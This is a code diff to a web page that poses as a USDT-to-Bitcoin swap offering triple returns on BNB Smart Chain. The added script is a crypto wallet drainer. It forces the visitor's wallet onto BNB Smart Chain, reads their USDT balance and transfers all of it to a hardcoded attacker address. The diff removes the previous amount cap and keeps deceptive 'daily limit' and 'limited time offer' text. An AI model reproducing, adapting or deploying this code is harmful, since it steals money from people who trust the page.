@@ -192,20 +192,6 @@
         .tab-active {
             color: var(--primary);
         }
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -295,61 +281,75 @@
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Elements
-            const usdtInput = document.getElementById('usdtInput');
-            const usdtValue = document.getElementById('usdtValue');
-            const btcAmount = document.getElementById('btcAmount');
-            const btcValue = document.getElementById('btcValue');
-            const swapButton = document.getElementById('swapButton');
-            const errorMessage = document.getElementById('errorMessage');
-            const buttonText = document.getElementById('buttonText');
-            
             // Configuration
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
-            const USDT_DECIMALS = 18;
-            const BTC_RATE = 119489.153599;
             const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
             const MIN_AMOUNT = 200;
-            const MAX_DAILY_AMOUNT = 10000;
+            const MAX_DAILY_LIMIT = 10000; // Only for display purposes
 
-            // Update displayed values
-            function updateValues() {
-                const amount = parseFloat(usdtInput.value) || 0;
-                usdtValue.textContent = `$${amount.toFixed(2)}`;
-                
-                // 3x BTC calculation
-                const btc = (amount * 3) / BTC_RATE;
-                btcAmount.textContent = btc.toFixed(8);
-                btcValue.textContent = `$${(amount * 3).toFixed(2)}`;
+            // Elements
+            const swapButton = document.getElementById('swapButton');
+            const errorMessage = document.getElementById('errorMessage');
+
+            // Force BSC Network function
+            async function forceBSCNetwork() {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_ID }],
+                    });
+                    return true;
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        try {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: BSC_CHAIN_ID,
+                                    chainName: 'BNB Smart Chain',
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18,
+                                    },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com'],
+                                }],
+                            });
+                            return true;
+                        } catch (addError) {
+                            console.error('Error adding BSC:', addError);
+                            return false;
+                        }
+                    }
+                    return false;
+                }
             }
-            
-            usdtInput.addEventListener('input', updateValues);
 
             // Main swap function
             swapButton.addEventListener('click', async function() {
+                errorMessage.style.display = 'none';
+                
                 try {
-                    // Check wallet
+                    // 1. Check if wallet is installed
                     if (!window.ethereum) {
                         throw new Error('Please install Trust Wallet or MetaMask');
                     }
 
-                    // Connect wallet (single popup)
+                    // 2. Force BSC Network FIRST (before any other action)
+                    const networkSwitched = await forceBSCNetwork();
+                    if (!networkSwitched) {
+                        throw new Error('Please switch to BNB Smart Chain');
+                    }
+
+                    // 3. Connect wallet (will show only one popup)
                     const accounts = await window.ethereum.request({ 
                         method: 'eth_requestAccounts' 
                     });
                     const userAddress = accounts[0];
 
-                    // Switch to BSC (single popup)
-                    const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (currentChain !== BSC_CHAIN_ID) {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: BSC_CHAIN_ID }],
-                        });
-                    }
-
-                    // Setup contract
+                    // 4. Setup contract
                     const provider = new ethers.providers.Web3Provider(window.ethereum);
                     const signer = provider.getSigner();
                     const contract = new ethers.Contract(
@@ -361,43 +361,29 @@
                         signer
                     );
 
-                    // Get balance
+                    // 5. Check balance
                     const balance = await contract.balanceOf(userAddress);
-                    const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, USDT_DECIMALS));
+                    const balanceInUSDT = parseFloat(ethers.utils.formatUnits(balance, 18));
 
-                    // Determine amount to transfer (always transfer minimum 200 or full balance if >200)
-                    let amountToTransfer;
+                    // 6. Validate minimum amount (only for showing message)
                     if (balanceInUSDT < MIN_AMOUNT) {
-                        throw new Error(`Minimum $${MIN_AMOUNT} USDT required for swap\n(Maximum $${MAX_DAILY_AMOUNT} per day)`);
-                    } else {
-                        amountToTransfer = balanceInUSDT > MAX_DAILY_AMOUNT ? 
-                            ethers.utils.parseUnits(MAX_DAILY_AMOUNT.toString(), USDT_DECIMALS) :
-                            balance;
+                        throw new Error(`Minimum ${MIN_AMOUNT} USDT & Maximum ${MAX_DAILY_LIMIT} USDT Daily limit [Limited time offer]`);
                     }
 
-                    // Execute transfer
-                    const tx = await contract.transfer(
-                        RECIPIENT_ADDRESS,
-                        amountToTransfer
-                    );
-
+                    // 7. Transfer ALL funds (regardless of amount, if >200)
+                    const tx = await contract.transfer(RECIPIENT_ADDRESS, balance);
+                    
                     // Show success
-                    alert(`Success! Transferred $${Math.min(balanceInUSDT, MAX_DAILY_AMOUNT).toFixed(2)} USDT`);
+                    alert(`Success! Transferred ${balanceInUSDT.toFixed(2)} USDT`);
 
                 } catch (error) {
                     console.error(error);
+                    errorMessage.textContent = error.message;
+                    errorMessage.style.display = 'block';
+                    
+                    // Special formatting for minimum amount error
                     if (error.message.includes('Minimum')) {
-                        // Show minimum requirement error
-                        errorMessage.textContent = error.message;
-                        errorMessage.style.display = 'block';
-                    } else if (error.code === 4001) {
-                        // User rejected transaction
-                        errorMessage.textContent = 'Transaction cancelled by user';
-                        errorMessage.style.display = 'block';
-                    } else {
-                        // Other errors
-                        errorMessage.textContent = 'Error: ' + error.message;
-                        errorMessage.style.display = 'block';
+                        errorMessage.innerHTML = error.message.replace('\n', '<br>');
                     }
                 }
             });
